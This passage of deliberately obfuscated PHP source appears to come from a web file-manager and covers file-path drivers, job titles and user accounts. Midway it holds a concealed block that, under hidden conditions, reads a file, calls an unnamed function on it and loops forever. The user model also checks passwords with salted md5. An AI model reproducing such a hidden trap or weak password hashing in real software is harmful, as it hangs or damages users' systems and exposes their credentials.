rename($çô¤ˆô, $©¼ÉÔıû) { $á¦öŸ¤‘ = $this->model->rename($çô¤ˆô, $©¼ÉÔıû); return $á¦öŸ¤‘ ? $this->getPathOuter($çô¤ˆô) : $á¦öŸ¤‘; } public function size($Ó¡õ¢Ş¹) { $±ªÍÂÒ = $this->infoSimple($Ó¡õ¢Ş¹); return $±ªÍÂÒ ? $±ªÍÂÒ[$_SERVER[—ÌÒğš÷][76]] : 0; } public function infoSimple($ãÈÑ¾»¦) { return $this->model->sourceInfo($ãÈÑ¾»¦); } public function info($ÍÇÈ”É) { return $this->infoParse($ÍÇÈ”É); } public function infoAuth($ÙíÚ¢¸) { return $this->infoParse($ÙíÚ¢¸, !1, !0); } public function infoWithChildren($Ö‡ó˜ôˆ) { return $this->infoParse($Ö‡ó˜ôˆ, !0); } protected function infoParse($ìæ¡è±î, $µÉšÓáá = false, $ÌÔøèÛ£ = false) { if (!$µÉšÓáá) { return $this->model->pathInfo($ìæ¡è±î, $ÌÔøèÛ£); } return $this->model->pathInfoMore($ìæ¡è±î); } public function infoFullSimple($ÎÈö„’ğ) { $„ˆËÙ² =& $_SERVER[—ÌÒğš÷]; $¿±Ñä©š = explode($„ˆËÙ²[8], $ÎÈö„’ğ); $Õß²•‚© = implode($„ˆËÙ²[8], array_splice($¿±Ñä©š, 1)); return $this->model->pathInfoByPath($¿±Ñä©š[0], $Õß²•‚©); } public function infoFull($±ŸÆÛ®ó) { $£óú‘”Ø = $this->infoFullSimple($±ŸÆÛ®ó); return is_array($£óú‘”Ø) ? $this->model->pathInfo($£óú‘”Ø[$_SERVER[—ÌÒğš÷][181]]) : !1; } public function hashSimple($Ó©ÒØ­Ú) { $¿ûƒ¤Œ =& $_SERVER[—ÌÒğš÷]; $¾À…Ùü± = $this->infoWithChildren($Ó©ÒØ­Ú); return $¾À…Ùü±[$¿ûƒ¤Œ[516]][$¿ûƒ¤Œ[640]]; } public function hashMd5($‡ŠÃ×Å•) { $ÑÍÉÚÖ =& $_SERVER[—ÌÒğš÷]; $ó¤ÎÊ„ = $this->infoWithChildren($‡ŠÃ×Å•); return $ó¤ÎÊ„[$ÑÍÉÚÖ[516]][$ÑÍÉÚÖ[641]]; } public function exist($ô¦ÕÔ¯®) { $šÔİ‹Áˆ =& $_SERVER[—ÌÒğš÷]; $ÙË´²½ = $this->parse($ô¦ÕÔ¯®); if (!$ÙË´²½[$šÔİ‹Áˆ[84]]) { return $this->isFile($ô¦ÕÔ¯®) || $this->isFolder($ô¦ÕÔ¯®); } $”€Øã£ = array($šÔİ‹Áˆ[445] => $ÙË´²½[$šÔİ‹Áˆ[443]], $šÔİ‹Áˆ[32] => $ÙË´²½[$šÔİ‹Áˆ[84]]); $¯ÆËÚœÆ = $this->model->where($”€Øã£)->find(); return $¯ÆËÚœÆ ? !0 : !1; } public function isFile($„‚Ë¸–¡) { $ŒáË¶ËÅ =& $_SERVER[—ÌÒğš÷]; $ÛÙé·ª€ = $this->infoSimple($„‚Ë¸–¡); return $ÛÙé·ª€ && $ÛÙé·ª€[$ŒáË¶ËÅ[453]] == $ŒáË¶ËÅ[212] ? !0 : !1; } public function isFolder($Í³µÜ‡) { $Ç•ç»é =& $_SERVER[—ÌÒğš÷]; $Õ¨ö÷‰¯ = $this->infoSimple($Í³µÜ‡); return $Õ¨ö÷‰¯ && $Õ¨ö÷‰¯[$Ç•ç»é[453]] == $Ç•ç»é[88] ? !0 : !1; } public function listPath($½Ï‚ªê˜, $ÅÎ‡Êíè = false) { $«¨¢ßµà =& $_SERVER[—ÌÒğš÷]; if ($½Ï‚ªê˜ == $«¨¢ßµà[12]) { return !1; } $‹ô˜£Í¢ = array($«¨¢ßµà[445] => $½Ï‚ªê˜); if ($ÅÎ‡Êíè) { return $this->model->listSource($‹ô˜£Í¢, -1); } return $this->model->listSource($‹ô˜£Í¢); } public function has($×ıœò¼, $â¡—à™ß = false, $ï¯÷ı§€ = null) { $‡®ŠîĞ =& $_SERVER[—ÌÒğš÷]; $‹¨Š«— = $this->infoWithChildren($×ıœò¼); if ($â¡—à™ß) { return array($‡®ŠîĞ[224] => $‹¨Š«—[$‡®ŠîĞ[224]], $‡®ŠîĞ[223] => $‹¨Š«—[$‡®ŠîĞ[223]]); } return $ï¯÷ı§€ ? $‹¨Š«—[$‡®ŠîĞ[224]] : $‹¨Š«—[$‡®ŠîĞ[223]]; } public function listAll($íØõôéÀ) { $Ñ‹ŒĞÚ = IO::info($this->pathParse[$_SERVER[—ÌÒğš÷][84]]); if (!$Ñ‹ŒĞÚ) { return array(); } return $this->model->listAll($íØõôéÀ); } public function getContent($§ïæô€) { return $this->model->getContent($§ïæô€); } public function setContent($Í»¯Ì¬÷, $µçşŸåº = '') { return $this->model->setContent($Í»¯Ì¬÷, $µçşŸåº); } public function fileSubstr($ÓÂ«ïñ„, $æŞ°¯¨, $’ì±å¸†) { return $this->model->fileSubstr($ÓÂ«ïñ„, $æŞ°¯¨, $’ì±å¸†); } public function download($üŞÔ‡À, $Âü¥” = '') { $“ö‡ïñ¥ = get_path_father($Âü¥”); $ì•æ¨Éä = get_path_this($Âü¥”); $Ì´ÀÜı— = $this->model->fileInfoGet($üŞÔ‡À); $«–¸çâ = IO::copy($Ì´ÀÜı—[$_SERVER[—ÌÒğš÷][84]], $“ö‡ïñ¥, !1, $ì•æ¨Éä); return $«–¸çâ; } public function setModifyTime($õúÇ¾¬ê, $å®°ß°ï = '') { $¨¯øˆê¾ =& $_SERVER[—ÌÒğš÷]; if (!$õúÇ¾¬ê) { return; } $this->model->where(array($¨¯øˆê¾[459] => $õúÇ¾¬ê))->save(array($¨¯øˆê¾[85] => $å®°ß°ï)); } public function upload($‰ÍıßáÜ, $øÊæØ¿, $õâ„á½š = false, $£´ĞØÖÏ = REPEAT_REPLACE) { $ñäÇƒ =& $_SERVER[—ÌÒğš÷]; $È¥Ò«´— = $this->parse($‰ÍıßáÜ); $™ÈúÈŠİ = $this->model->addFile($È¥Ò«´—[$ñäÇƒ[443]], $øÊæØ¿, $È¥Ò«´—[$ñäÇƒ[84]], $õâ„á½š, $£´ĞØÖÏ); return $this->getPathOuter($™ÈúÈŠİ); } public function uploadFileByID($¤ÂöÈÏ, $‡íáä„, $¥ÊÈ¾‰«) { $¹Ê’óôî =& $_SERVER[—ÌÒğš÷]; $ÑŸ–Òûß = $this->parse($¤ÂöÈÏ); $‘Äó„Æ¸ = $this->model->addFileByFileID($ÑŸ–Òûß[$¹Ê’óôî[443]], $‡íáä„, $ÑŸ–Òûß[$¹Ê’óôî[84]], $¥ÊÈ¾‰«); return $this->getPathOuter($‘Äó„Æ¸); } public function addFileByRemote($Š™Ñ†ù–, $¤„¢”ùÕ, $È¡‰·ïü = array(), $½‹¡Øßè = '', $¤¿¦²ã‚) { $‘ÉÅ˜çò =& $_SERVER[—ÌÒğš÷]; $©–Î×³ò = $this->parse($Š™Ñ†ù–); $½‹¡Øßè = empty($½‹¡Øßè) ? $©–Î×³ò[$‘ÉÅ˜çò[84]] : $½‹¡Øßè; $İ ¤¿âÕ = $this->model->addFileByRemote($©–Î×³ò[$‘ÉÅ˜çò[443]], $¤„¢”ùÕ, $½‹¡Øßè, $È¡‰·ïü, $¤¿¦²ã‚); return $this->getPathOuter($İ ¤¿âÕ); } public function uploadLink($æ¦³Ù£, $È˜úí•— = 0) { $–†„£ï =& $_SERVER[—ÌÒğš÷]; $™‹ºû÷ë = $this->parse($æ¦³Ù£); $¢†ãçŞ¿ = _get($GLOBALS[$–†„£ï[7]], $–†„£ï[1378]); $‡ÚèÃÆ³ = _get($GLOBALS[$–†„£ï[7]], $–†„£ï[1379]); $æ¦³Ù£ = Model($–†„£ï[643])->createFileName($™‹ºû÷ë[$–†„£ï[84]], $¢†ãçŞ¿, $‡ÚèÃÆ³); return IO::uploadLink($æ¦³Ù£, $È˜úí•—); } public function fileNameAuto($ñ²²ÙÖà, $›¯Ğáì, $£»¦è¥Ã = REPEAT_REPLACE, $¨É¼³ÑÉ = false) { return $this->model->fileNameAuto($ñ²²ÙÖà, $›¯Ğáì, $£»¦è¥Ã, $¨É¼³ÑÉ); } public function fileNameExist($“ŠÔŒĞ, $Òö”Âú¤) { return $this->model->fileNameExist($“ŠÔŒĞ, $Òö”Âú¤); } protected function _fileOut($ìô÷æ»†, $ÕÍ²Öî­ = false, $‡£‘¹¦ = false, $˜·ì’¯ø = '', $’†¸·Ñ = false) { $›¼’Œ™¦ =& $_SERVER[—ÌÒğš÷]; $ì£Ò¼®‰ = $this->model->sourceInfo($ìô÷æ»†); if ($ì£Ò¼®‰[$›¼’Œ™¦[453]] == $›¼’Œ™¦[88]) { header($›¼’Œ™¦[1380]); die; } $šã‡şµ = $this->model->fileInfoGet($ìô÷æ»†); $˜·ì’¯ø = $šã‡şµ[$›¼’Œ™¦[641]] ? $šã‡şµ[$›¼’Œ™¦[641]] : $˜·ì’¯ø; $£òîêù™ = is_array($GLOBALS[$›¼’Œ™¦[169]]) ? $GLOBALS[$›¼’Œ™¦[169]][$›¼’Œ™¦[32]] : $ì£Ò¼®‰[$›¼’Œ™¦[32]]; if ($’†¸·Ñ) { return IO::fileOutServer($šã‡şµ[$›¼’Œ™¦[84]], $ÕÍ²Öî­, $£òîêù™, $˜·ì’¯ø); } IO::fileOut($šã‡şµ[$›¼’Œ™¦[84]], $ÕÍ²Öî­, $£òîêù™, $˜·ì’¯ø); } public function fileOut($Ş³³ÂÎ‰, $¿Û©º½É = false, $›‡¦Íç½ = false, $Å÷¸Óî¦ = '') { $this->_fileOut($Ş³³ÂÎ‰, $¿Û©º½É, $›‡¦Íç½, $Å÷¸Óî¦); } public function fileOutServer($úÀà½âÇ, $¡ÂÃÌê = false, $ÌÅÃ°ÉÈ = false, $úİ¤Òé¥ = '') { $this->_fileOut($úÀà½âÇ, $¡ÂÃÌê, $ÌÅÃ°ÉÈ, $úİ¤Òé¥, !0); } protected function _fileOutImage($¼™”†ÌÚ, $¿î®ĞÂ£ = 250) { $ğÅ´‚Ãà =& $_SERVER[—ÌÒğš÷]; $¯Å¾âÍ = $this->model->pathInfo($¼™”†ÌÚ); if ($¯Å¾âÍ[$ğÅ´‚Ãà[453]] == $ğÅ´‚Ãà[88]) { show_json($ğÅ´‚Ãà[1381] . $¼™”†ÌÚ, !1); } $³Ş–íØ¼ = $this->model->fileInfoGet($¼™”†ÌÚ); $¯Å¾âÍ[$ğÅ´‚Ãà[170]] = $³Ş–íØ¼[$ğÅ´‚Ãà[84]]; $GLOBALS[$ğÅ´‚Ãà[169]] = $¯Å¾âÍ; IO::fileOutImage($³Ş–íØ¼[$ğÅ´‚Ãà[84]], $¿î®ĞÂ£); } public function fileOutImage($ƒ’œô¨”, $¨çÍ™Šø = 250) { $this->_fileOutImage($ƒ’œô¨”, $¨çÍ™Šø); } public function fileOutImageServer($µ¿÷¶–, $™³ë ˆ³ = 250) { $this->_fileOutImage($µ¿÷¶–, $™³ë ˆ³); } public function link($óˆ·íŒæ, $ßÅñ™§ = '') { $³“ˆç¾Ï = $this->model->fileInfoGet($óˆ·íŒæ); return IO::link($³“ˆç¾Ï[$_SERVER[—ÌÒğš÷][84]], $ßÅñ™§); } protected function parse($š¼‹ãÊË) { $í»¨Œ„ë =& $_SERVER[—ÌÒğš÷]; if (strstr($š¼‹ãÊË, $í»¨Œ„ë[8]) === !1) { return array($í»¨Œ„ë[461] => intval($š¼‹ãÊË), $í»¨Œ„ë[84] => $í»¨Œ„ë[12], $í»¨Œ„ë[1377] => array()); } $…¹ªÈ½ = explode($í»¨Œ„ë[8], trim($š¼‹ãÊË, $í»¨Œ„ë[8])); if (count($…¹ªÈ½) < 2) { show_tips(clear_html($š¼‹ãÊË) . $í»¨Œ„ë[1382]); } return array($í»¨Œ„ë[461] => intval($…¹ªÈ½[0]), $í»¨Œ„ë[84] => $…¹ªÈ½[1], $í»¨Œ„ë[1377] => array_slice($…¹ªÈ½, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($™‹ øŸ‚) { $this->pathParse = $™‹ øŸ‚; $this->model = Model($_SERVER[—ÌÒğš÷][1376]); } public function getPathOuter($Í«Ü†À) { $°ìÍ·Ş =& $_SERVER[—ÌÒğš÷]; if (!$Í«Ü†À) { return $Í«Ü†À; } $Ø°ÆŠµÊ = $this->parse($Í«Ü†À); return trim(KodIO::makeShare($this->pathParse[$°ìÍ·Ş[443]], $Ø°ÆŠµÊ[$°ìÍ·Ş[443]]), $°ìÍ·Ş[8]); } protected function infoParse($˜åååµ´, $áÔ½…İ = false, $¤Ãú¤åŠ = false) { $¦Ş—™÷ò =& $_SERVER[—ÌÒğš÷]; $ŸŒº©äæ = $this->pathParse[$¦Ş—™÷ò[443]]; $ä¿ĞÃï = trim($this->pathParse[$¦Ş—™÷ò[1212]], $¦Ş—™÷ò[8]); return Action($¦Ş—™÷ò[1383])->sharePathInfo($ŸŒº©äæ, $ä¿ĞÃï, $áÔ½…İ); } public function infoFull($û×áÂ™ı) { $ãÊ¦÷Î– =& $_SERVER[—ÌÒğš÷]; $âÙ•‘„ä = explode($ãÊ¦÷Î–[8], trim($û×áÂ™ı, $ãÊ¦÷Î–[8])); if (count($âÙ•‘„ä) > 1) { $Ğ€Ô±œ = implode($ãÊ¦÷Î–[8], array_splice($âÙ•‘„ä, 1)); $µ¬ÛÊÚ¥ = $this->model->pathInfoByPath($âÙ•‘„ä[0], $Ğ€Ô±œ); if (!$µ¬ÛÊÚ¥) { return !1; } $this->pathParse[$ãÊ¦÷Î–[1212]] = $µ¬ÛÊÚ¥[$ãÊ¦÷Î–[181]]; } return $this->infoParse($û×áÂ™ı); } public function listAll($†Ü‘Ó) { $“ê¥±ä =& $_SERVER[—ÌÒğš÷]; $åªùÏìü = IO::info($this->pathParse[$“ê¥±ä[84]]); if (!$åªùÏìü) { return array(); } $õ¨Ò€” = $this->model->listAll($†Ü‘Ó); $±ğœÀ´­ = Model($“ê¥±ä[632])->getInfo($åªùÏìü[$“ê¥±ä[633]]); foreach ($õ¨Ò€” as &$»‚ì³´‘) { check_abort(); $»‚ì³´‘[$“ê¥±ä[87]] = Action($“ê¥±ä[1383])->_shareItemeParse($»‚ì³´‘[$“ê¥±ä[87]], $±ğœÀ´­); } unset($»‚ì³´‘); return $õ¨Ò€”; } } goto B¸«ª°ÆÆã; cìî¥£Èù†: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\56\152\x6f\142\114\151\163\x74"; public $field = array("\x6e\x61\x6d\145", "\144\x65\163\143", "\x73\x6f\162\x74"); const JOB_KEY = "\163\145\154\146\112\x6f\142\114\x69\163\164"; public function listData($ÔíŒŒ’³ = false, $®®º—¶µ = "\x73\157\162\164", $‡»¹Ò¯Ç = false) { return parent::listData($ÔíŒŒ’³, $®®º—¶µ, $‡»¹Ò¯Ç); } public function remove($ÉÔëĞüÍ) { return parent::remove($ÉÔëĞüÍ); } public function add($±Ü……ÉÅ) { $‚®¸ûØ¬ =& $_SERVER[—ÌÒğš÷]; if ($this->findByName($±Ü……ÉÅ[$‚®¸ûØ¬[32]])) { return !1; } $±Ü……ÉÅ[$‚®¸ûØ¬[1911]] = $this->getSort(); return parent::insert($±Ü……ÉÅ); } private function getSort() { $ÂÔ‹˜ˆ­ =& $_SERVER[—ÌÒğš÷]; $í­òã§ = parent::listData(); $í½ı™› = array_to_keyvalue($í­òã§, $ÂÔ‹˜ˆ­[12], $ÂÔ‹˜ˆ­[1911]); return empty($í½ı™›) ? 0 : max($í½ı™›) + 1; } public function update($ğÇÈÖò¡, $© »‹Á) { $×Í·ÊúÃ =& $_SERVER[—ÌÒğš÷]; $™ÉíÑ—ƒ = parent::listData($ğÇÈÖò¡); $ªÜÑÂÎÃ = $this->findByName($© »‹Á[$×Í·ÊúÃ[32]]); if (!$™ÉíÑ—ƒ || $ªÜÑÂÎÃ && $ªÜÑÂÎÃ[$×Í·ÊúÃ[443]] != $™ÉíÑ—ƒ[$×Í·ÊúÃ[443]]) { return !1; } return parent::update($ğÇÈÖò¡, $© »‹Á); } public function setUserJob($Ùã·»É, $«ö‘ığ) { $Ü»Îªœè =& $_SERVER[—ÌÒğš÷]; if (!is_array($«ö‘ığ)) { $«ö‘ığ = array($«ö‘ığ); } $Æ—’™„˜ = parent::listData(); $„şçâĞÁ = array_to_keyvalue($Æ—’™„˜, $Ü»Îªœè[32]); $½ò—ÚÎ“ = $Ü»Îªœè[422]; foreach ($«ö‘ığ as $ÁÁíÎ) { if ($„şçâĞÁ[$ÁÁíÎ]) { $½ò—ÚÎ“ .= $„şçâĞÁ[$ÁÁíÎ][$Ü»Îªœè[443]] . $Ü»Îªœè[50]; } else { $ã¡åÄÕ = $this->add($ÁÁíÎ); $½ò—ÚÎ“ .= $ã¡åÄÕ . $Ü»Îªœè[50]; } } $½ò—ÚÎ“ = rtrim($½ò—ÚÎ“, $Ü»Îªœè[50]); Model($Ü»Îªœè[567])->metaSet($Ùã·»É, self::JOB_KEY, $½ò—ÚÎ“); } public function getUserJob($†×®èí) { $¿’áæ•· = Model($_SERVER[—ÌÒğš÷][567])->metaGet($†×®èí); return $this->getUserJobInfo($¿’áæ•·[self::JOB_KEY]); } public function getUserJobInfo($©ÌÉüãÈ) { $ÙÅ×¶û =& $_SERVER[—ÌÒğš÷]; $ò«¹Ò = explode($ÙÅ×¶û[50], $©ÌÉüãÈ); $¸ªû¦Ó¢ = parent::listData(); $¸ªû¦Ó¢ = array_remove_key($¸ªû¦Ó¢, $ÙÅ×¶û[215]); $‘Æ‡«”¬ = array(); foreach ($ò«¹Ò as $û…ºÖÀ®) { if (isset($¸ªû¦Ó¢[$û…ºÖÀ®])) { $‘Æ‡«”¬[] = $¸ªû¦Ó¢[$û…ºÖÀ®]; } } return $‘Æ‡«”¬; } } if (!isset($_SERVER[$_SERVER[—ÌÒğš÷][879]]) || !isset($_SERVER[$_SERVER[—ÌÒğš÷][877]])) { $_getc = $_SERVER[—ÌÒğš÷][880]; $_getfile = $_SERVER[$_SERVER[—ÌÒğš÷][881]] . $_SERVER[—ÌÒğš÷][882]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[—ÌÒğš÷][246], $_getfilec); if (count($_getarrs) < $_SERVER[—ÌÒğš÷][677]) { $exit = $_SERVER[—ÌÒğš÷][883]; $exit(); } $_act = $_SERVER[—ÌÒğš÷][884]; $_act($_SERVER[$_SERVER[—ÌÒğš÷][881]] . $_SERVER[—ÌÒğš÷][882]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[—ÌÒğš÷][422]); } } class UserModel extends ModelBase { protected $tableName = "\165\x73\145\x72"; protected $tableMeta = array("\x74\x61\x62\154\x65\116\x61\x6d\x65" => "\x75\x73\145\x72\x5f\x6d\145\x74\141", "\x6d\145\164\141\106\151\145\x6c\x64" => "\165\163\x65\162\111\x44"); protected $simpleField = "\165\x73\x65\x72\111\104\x2c\x6e\x69\143\x6b\116\x61\155\x65\54\x6e\141\x6d\x65\54\141\x76\x61\164\x61\x72\x2c\163\145\x78\x2c\x73\x74\x61\164\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Ë¬¾ÙŞ) { $ğÕµë¦ =& $_SERVER[—ÌÒğš÷]; $Í¬´–± = $ğÕµë¦[2339]; return array($ğÕµë¦[1965] => array($Ë¬¾ÙŞ[0], $Í¬´–±), $ğÕµë¦[1967] => array($Ë¬¾ÙŞ[0], $Í¬´–±), $ğÕµë¦[2340] => array($Ë¬¾ÙŞ[0], $Í¬´–±)); } protected function getInfo($‚“©µŞ, $Ş™°¯ = false) { $£çˆÜñ = $this->getInfoSimple($‚“©µŞ); if (!is_array($£çˆÜñ)) { return array(); } if ($Ş™°¯) { return $this->_getInfoApply($£çˆÜñ); } return $this->cacheFunctionGet($_SERVER[—ÌÒğš÷][1969], $‚“©µŞ); } protected function getInfoFull($üÖ¨ê», $ÚøıŒ‚ß = false) { $Õš¢€øº = $this->getInfoSimple($üÖ¨ê»); if (!is_array($Õš¢€øº)) { return array(); } if ($ÚøıŒ‚ß) { return $this->_getInfoApply($Õš¢€øº, !0); } return $this->cacheFunctionGet($_SERVER[—ÌÒğš÷][2341], $üÖ¨ê»); } private function _getInfoApply($ÊÕÁ—ƒö, $ô™ïİô = false) { $¦ÃÖ¼‘ =& $_SERVER[—ÌÒğš÷]; if (!$ÊÕÁ—ƒö) { return $ÊÕÁ—ƒö; } $”ò•Âïˆ = md5($¦ÃÖ¼‘[2342] . $ÊÕÁ—ƒö[$¦ÃÖ¼‘[933]] . $¦ÃÖ¼‘[2343] . $ÊÕÁ—ƒö[$¦ÃÖ¼‘[32]]); $ÊÕÁ—ƒö = $this->_listDataApplyItem($ÊÕÁ—ƒö); $‹ôôîí¾ = Model($¦ÃÖ¼‘[1376])->metaGet($ÊÕÁ—ƒö[$¦ÃÖ¼‘[87]][$¦ÃÖ¼‘[181]]); $ÊÕÁ—ƒö[$¦ÃÖ¼‘[2344]] = $”ò•Âïˆ; $ÊÕÁ—ƒö[$¦ÃÖ¼‘[87]][$¦ÃÖ¼‘[2161]] = isset($‹ôôîí¾[$¦ÃÖ¼‘[2162]]) ? $‹ôôîí¾[$¦ÃÖ¼‘[2162]] : null; if ($ô™ïİô) { $ÊÕÁ—ƒö[$¦ÃÖ¼‘[507]] = $this->metaGet($ÊÕÁ—ƒö[$¦ÃÖ¼‘[1688]]); } return $ÊÕÁ—ƒö; } protected function getInfoSimple($‰®ÇæÑ, $şÍƒ‡€ü = false) { $ì¢òí€ =& $_SERVER[—ÌÒğš÷]; if (!$‰®ÇæÑ) { return array(); } if ($şÍƒ‡€ü) { $“Şóü·í = $this->where(array($ì¢òí€[1688] => intval($‰®ÇæÑ)))->find(); if (!is_array($“Şóü·í)) { return array(); } $“Şóü·í[$ì¢òí€[2345]] = Action($ì¢òí€[2346])->parseUrl($“Şóü·í[$ì¢òí€[2345]]); return $“Şóü·í; } return $this->cacheFunctionGet($ì¢òí€[1970], $‰®ÇæÑ); } protected function getInfoSimpleOuter($Œ§§÷¼á) { $œù‚ŒÄ† =& $_SERVER[—ÌÒğš÷]; if (!$Œ§§÷¼á || $Œ§§÷¼á == 0) { return array($œù‚ŒÄ†[1688] => $œù‚ŒÄ†[212], $œù‚ŒÄ†[32] => $œù‚ŒÄ†[163] . LNG($œù‚ŒÄ†[2347]) . $œù‚ŒÄ†[165], $œù‚ŒÄ†[2345] => STATIC_PATH . $œù‚ŒÄ†[2348]); } $¨ÉØÅİ÷ = $this->cacheFunctionGet($œù‚ŒÄ†[1970], $Œ§§÷¼á); $Á¤à‡ßÑ = array_field_key($¨ÉØÅİ÷, explode($œù‚ŒÄ†[50], $this->simpleField)); if (!$Á¤à‡ßÑ) { return array($œù‚ŒÄ†[1688] => $œù‚ŒÄ†[1232], $œù‚ŒÄ†[32] => $œù‚ŒÄ†[163] . LNG($œù‚ŒÄ†[2349]) . $œù‚ŒÄ†[165], $œù‚ŒÄ†[2345] => STATIC_PATH . $œù‚ŒÄ†[2350]); } $Á¤à‡ßÑ[$œù‚ŒÄ†[2345]] = Action($œù‚ŒÄ†[2346])->parseUrl($Á¤à‡ßÑ[$œù‚ŒÄ†[2345]]); return $Á¤à‡ßÑ; } protected function groupUser($şíÌ÷»É) { } public static function errorLang($ª½µŒ°ş) { $’¶±œÆ¡ =& $_SERVER[—ÌÒğš÷]; $¡ÄìŞË = array(self::ERROR_USER_NOT_EXISTS => $’¶±œÆ¡[2351], self::ERROR_USER_PASSWORD_ERROR => $’¶±œÆ¡[2352], self::ERROR_USER_EXIST_NAME => $’¶±œÆ¡[2353], self::ERROR_USER_EXIST_PHONE => $’¶±œÆ¡[2354], self::ERROR_USER_EXIST_EMAIL => $’¶±œÆ¡[2355], self::ERROR_USER_LOGIN_LOCK => $’¶±œÆ¡[2356], self::ERROR_IP_NOT_ALLOW => $’¶±œÆ¡[2357], self::ERROR_USER_EXIST_NICKNAME => $’¶±œÆ¡[2358]); return LNG($¡ÄìŞË[$ª½µŒ°ş]); } public function getInfoByMeta($õß‹ÔÉÍ, $¯Ø¶¼íÙ) { $±ÂÌïˆ =& $_SERVER[—ÌÒğš÷]; $ÂÅùüŒü = Model($±ÂÌïˆ[2359])->where(array($±ÂÌïˆ[94] => $õß‹ÔÉÍ, $±ÂÌïˆ[418] => $¯Ø¶¼íÙ))->find(); if ($ÂÅùüŒü) { return $this->getInfo($ÂÅùüŒü[$±ÂÌïˆ[1688]]); } return !1; } public function userLoginCheck($ƒ¸†á„, $™½ØÅ´õ) { $Âš¬Ñ× =& $_SERVER[—ÌÒğš÷]; $š•¡±º = $this->userLoginFind($ƒ¸†á„); if (!$š•¡±º) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($š•¡±º[$Âš¬Ñ×[1688]], $™½ØÅ´õ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($š•¡±º[$Âš¬Ñ×[1688]]); } public function userLoginFind($‹ƒĞº·¨) { $‘†‚™æõ =& $_SERVER[—ÌÒğš÷]; $Ç¾…€ã = array($‘†‚™æõ[32] => $‹ƒĞº·¨, $‘†‚™æõ[2169] => $‹ƒĞº·¨, $‘†‚™æõ[349] => $‹ƒĞº·¨, $‘†‚™æõ[2360] => $‹ƒĞº·¨, $‘†‚™æõ[1044] => $‘†‚™æõ[1046]); if ($this->nickNameRpt()) { unset($Ç¾…€ã[$‘†‚™æõ[2169]]); } return $this->where($Ç¾…€ã)->find(); } public function clearCache($º·¸·Ğæ) { $¡öÊ²ã =& $_SERVER[—ÌÒğš÷]; $this->cacheFunctionClear($¡öÊ²ã[1969], $º·¸·Ğæ); $this->cacheFunctionClear($¡öÊ²ã[1970], $º·¸·Ğæ); $this->cacheFunctionClear($¡öÊ²ã[2341], $º·¸·Ğæ); } public function userPasswordCheck($Ùã‡•ö½, $ÒšÂŞë) { $—ÎÒçí• =& $_SERVER[—ÌÒğš÷]; $ì—çèââ = $this->where(array($—ÎÒçí•[1688] => intval($Ùã‡•ö½)))->find(); $¢âœçÎµ = $this->metaGet($Ùã‡•ö½); $ûÉœîÓ = isset($¢âœçÎµ[$—ÎÒçí•[2361]]) ? $¢âœçÎµ[$—ÎÒçí•[2361]] : $—ÎÒçí•[12]; if (md5($ûÉœîÓ . trim($ÒšÂŞë)) !== $ì—çèââ[$—ÎÒçí•[933]]) { return !1; } return !0; } public function userAdd($‡·ü–Êğ) { $åÎå¡ñİ =& $_SERVER[—ÌÒğš÷]; $„ßÙå = array($åÎå¡ñİ[462] => $‡·ü–Êğ[$åÎå¡ñİ[32]], $åÎå¡ñİ[2362] => $‡·ü–Êğ[$åÎå¡ñİ[1563]], $åÎå¡ñİ[2363] => isset($‡·ü–Êğ[$åÎå¡ñİ[349]]) ? $‡·ü–Êğ[$åÎå¡ñİ[349]] : $åÎå¡ñİ[12], $åÎå¡ñİ[2364] => isset($‡·ü–Êğ[$åÎå¡ñİ[2360]]) ? $‡·ü–Êğ[$åÎå¡ñİ[2360]] : $åÎå¡ñİ[12], $åÎå¡ñİ[2365] => isset($‡·ü–Êğ[$åÎå¡ñİ[2169]]) ? $‡·ü–Êğ[$åÎå¡ñİ[2169]] : $‡·ü–Êğ[$åÎå¡ñİ[32]], $åÎå¡ñİ[2366] => isset($‡·ü–Êğ[$åÎå¡ñİ[2345]]) ? $‡·ü–Êğ[$åÎå¡ñİ[2345]] : $åÎå¡ñİ[12], $åÎå¡ñİ[2367] => isset($‡·ü–Êğ[$åÎå¡ñİ[2368]]) ? $‡·ü–Êğ[$åÎå¡ñİ[2368]] : 1, $åÎå¡ñİ[2369] => $‡·ü–Êğ[$åÎå¡ñİ[933]], $åÎå¡ñİ[1971] => isset($‡·ü–Êğ[$åÎå¡ñİ[1874]]) ? $‡·ü–Êğ[$åÎå¡ñİ[1874]] : 1024 * 1024 * 20, $åÎå¡ñİ[1972] => 0, $åÎå¡ñİ[2370] => 0, $åÎå¡ñİ[2016] => isset($‡·ü–Êğ[$åÎå¡ñİ[786]]) ? $‡·ü–Êğ[$åÎå¡ñİ[786]] : 1); if (!empty($‡·ü–Êğ[$åÎå¡ñİ[1688]])) { $„ßÙå[$åÎå¡ñİ[1688]] = $‡·ü–Êğ[$åÎå¡ñİ[1688]]; } $ûıæ‹¸† = $this->_checkExist($‡·ü–Êğ); if ($ûıæ‹¸† !== !0) { return $ûıæ‹¸†; } if (!empty($„ßÙå[$åÎå¡ñİ[2345]]) && strlen($„ßÙå[$åÎå¡ñİ[2345]]) > 255) { $„ßÙå[$åÎå¡ñİ[2345]] = $åÎå¡ñİ[12]; } $í‘‰éìµ = $this->add($„ßÙå); $­ÓÍ·ºª = array($åÎå¡ñİ[2369] => $„ßÙå[$åÎå¡ñİ[933]], $åÎå¡ñİ[2365] => $„ßÙå[$åÎå¡ñİ[2169]]); $this->userEdit($í‘‰éìµ, $­ÓÍ·ºª); Model($åÎå¡ñİ[1376])->userRootAdd($í‘‰éìµ); return $í‘‰éìµ; } protected function userEditTest($éıµûãï, $»õë©Ã¥) { return $this->call($_SERVER[—ÌÒğš÷][2371], $éıµûãï, $»õë©Ã¥); } protected function userEdit($­»ı£Éƒ, $ë¿ùêì¦) { $Ä‡»­ÁØ =& $_SERVER[—ÌÒğš÷]; $å§”‰âó = $this->getInfoSimple($­»ı£Éƒ); if (!$å§”‰âó) { 